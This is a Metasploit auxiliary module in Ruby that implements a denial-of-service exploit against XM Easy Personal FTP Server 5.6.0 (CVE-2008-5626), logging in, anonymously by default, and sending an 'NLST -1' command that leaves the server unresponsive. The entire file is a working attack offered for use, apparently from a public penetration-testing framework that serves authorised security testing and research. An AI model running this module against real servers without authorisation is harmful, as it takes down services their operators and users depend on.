##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Ftp
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'XM Easy Personal FTP Server 5.6.0 NLST DoS',
        'Description' => %q{
          This module is a port of shinnai's script.  You need
          a valid login, but even anonymous can do it as long
          as it has permission to call NLST.
        },
        'Author' => 'kris katterjohn',
        'License' => MSF_LICENSE,
        'References' => [
          [ 'CVE', '2008-5626'],
          [ 'OSVDB', '50837'],
          [ 'EDB', '6741' ]
        ],
        'DisclosureDate' => '2008-10-13',
        'Notes' => {
          'Stability' => [CRASH_SERVICE_DOWN],
          'SideEffects' => [],
          'Reliability' => []
        }
      )
    )

    register_options([
      OptString.new('FTPUSER', [ true, 'Valid FTP username', 'anonymous' ], fallbacks: ['USERNAME']),
      OptString.new('FTPPASS', [ true, 'Valid FTP password for username', 'anonymous' ], fallbacks: ['PASSWORD'])
    ])
  end

  def run
    return unless connect_login

    raw_send("NLST -1\r\n")

    disconnect

    print_status("OK, server may still be technically listening, but it won't respond")
  end
end
